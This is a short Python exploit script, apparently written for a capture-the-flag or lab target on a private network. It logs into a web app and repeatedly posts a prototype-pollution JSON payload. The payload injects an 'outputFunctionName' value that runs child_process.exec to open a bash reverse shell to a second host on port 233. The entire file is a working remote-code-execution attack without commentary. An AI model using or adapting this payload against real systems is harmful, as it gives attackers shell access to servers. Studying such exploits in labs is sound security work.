import requests

url = "http://192.168.65.132"

data_1 = {"type":"notice","content":{"constructor":{"prototype":
{"outputFunctionName":"a=1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/192.168.65.133/233  0>&1\"');"}}}}

login = {
    "username": "hi",
    "password": "123"
}

session = requests.Session()
r = session.post(url = url + "/login", data = login)

for i in range(6):
    r = session.post(url = url + "/add", json = data_1) #Must use json
    print(r.text)
rq_1 = session.get(url = url + "/get")

rq_1 = session.get(url =  url)
print(rq_1.text)